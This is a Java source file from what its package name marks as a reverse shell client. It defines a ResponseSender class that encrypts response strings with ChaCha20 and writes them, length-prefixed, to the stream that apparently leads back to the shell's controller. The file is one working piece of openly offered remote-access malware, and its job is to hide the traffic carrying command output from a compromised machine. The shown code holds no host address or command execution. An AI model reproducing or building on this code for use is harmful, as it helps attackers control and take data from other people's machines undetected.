package obs1d1anc1ph3r.reverseshell.client.responsehandling;

import java.io.IOException;
import java.security.SecureRandom;
import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class ResponseSender {

	private final StreamHandler streamHandler;
	private final byte[] encryptionKey;

	public ResponseSender(StreamHandler streamHandler, byte[] encryptionKey) {
		this.streamHandler = streamHandler;
		this.encryptionKey = encryptionKey;
	}

	//I have social anxiety, so I make computers respond for me -- You're not even good at that
	public void sendEncryptedResponse(String response) throws IOException, Exception {
		byte[] nonce = new byte[12];
		new SecureRandom().nextBytes(nonce);

		byte[] encryptedResponse = ChaCha20.encrypt(encryptionKey, nonce, ChaCha20.stringToBytes(response));

		streamHandler.getDataOut().writeInt(nonce.length + encryptedResponse.length);
		streamHandler.getDataOut().write(nonce);
		streamHandler.getDataOut().write(encryptedResponse);
		streamHandler.getDataOut().flush();
	}


}
